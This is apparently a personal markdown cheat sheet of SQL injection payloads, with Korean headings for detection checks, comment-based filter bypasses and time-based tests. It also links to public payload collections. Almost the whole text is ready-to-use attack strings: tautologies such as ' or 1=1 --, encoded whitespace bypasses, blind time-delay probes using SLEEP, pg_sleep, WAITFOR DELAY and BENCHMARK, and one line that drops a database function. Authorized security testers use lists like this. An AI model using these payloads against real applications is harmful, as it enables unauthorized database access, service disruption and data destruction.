# SQLInjection

```
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
```

```
,(select * from (select(sleep(10)))a)
';SELECT 1;SELECT pg_sleep\(30\);--'
```

```
https://github.com/payloadbox/sql-injection-payload-list
```
SqIinjection 테스트 코드 

탐지 점검
```
&apos;
'
%%2727
%25%27
```

`
select ‘abc’ || ‘def’;
`

```
/**/and/**/1=1/**/--
(1)and(1)=(1)
%09and%091=1%09--
%0Dand%0D1=1%0D--
%0Cand%0C1=1%0C--
%0Band%0B1=1%0B--
%0Aand%0A1=1%0A--
%A0and%A01=1%A0--
```



```
or 1=1 -- 
' or 1=1 -- 
" or 1=1 -- 
1 and 1=2 -- 
```

```
'//AND//'1%'='0 
```

주석으로 우회 
```
'/**/AND/**/'1%'='0
```

시간 기반 테스트 
```
'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z
'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
```

```
';WAITFOR DELAY '0:0:5'--
```

테스트
```
'||(SELECT 0x615a636e FROM DUAL WHERE 7192=7192 AND (SELECT 4865 FROM (SELECT(SLEEP(5)))VDbe))||'
```

```
`=`1` AND ELT(1337=1337 AND ELT(1337=1337,SLEEP(5*5)))|[1
```

OR x=y     

HAVING 1=0

AND 1=0


AND 7=9 AND (5=5
 AND 7=9 AND ('5=5
 AND 7=7 AND 'Z'='Y
 AND 7=7 AND ('Z'='Y
 WHERE 1=1 AND 1=0

AND SLEEP(15)
+ SLEEP(10) + '
' AnD SLEEP(15) ANd '1
(SELECT * FROM (SELECT(SLEEP(15)))ecMj)
+benchmark(3200,SHA1(1))+'
ORDER BY SLEEP(15)
'&&SLEEP(15)&&'1
0' AND SLEEP(15)
';WAITFOR DELAY '0:0:30'--
'+WAITFOR+DELAY+'0:0:10'--+-"

(select * from (select(sleep(10)))a)
%2c(select%20*%20from%20(select(sleep(10)))a)
'+(select*from(select(sleep(7*7)))a)+'
 OR 3=3 AND ('W' LIKE 'Y
AND (SELECT * FROM (SELECT(SLEEP(15)))bAKL) AND 'vRxe'='vRxe
IF(7=4) SELECT 7 ELSE DROP FUNCTION xcjl--
%' AND 1=8 AND '%'='
